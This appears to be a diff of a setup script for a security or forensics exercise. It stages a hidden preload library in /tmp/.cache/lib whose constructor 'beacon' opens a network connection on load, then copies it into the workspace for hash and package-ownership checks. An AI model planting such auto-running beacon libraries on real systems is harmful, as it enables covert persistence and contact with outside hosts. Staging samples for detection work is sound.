@@ -17,6 +17,7 @@ __attribute__((constructor)) static void beacon(void) {
     if (connect(fd, (struct sockaddr *)&a, sizeof(a)) == 0) close(fd);
 }
 EC
+cp /tmp/.cache/lib/libpreload.so .  # 工作区副本：哈希锚定+包归属反证进入可查面（2026-10-12 收尾项）
 printf "/tmp/.cache/lib\n" > watch_paths.txt
 : > approved_endpoints.txt
 printf "/tmp/.cache/lib/libpreload.so\n" > system_paths.txt
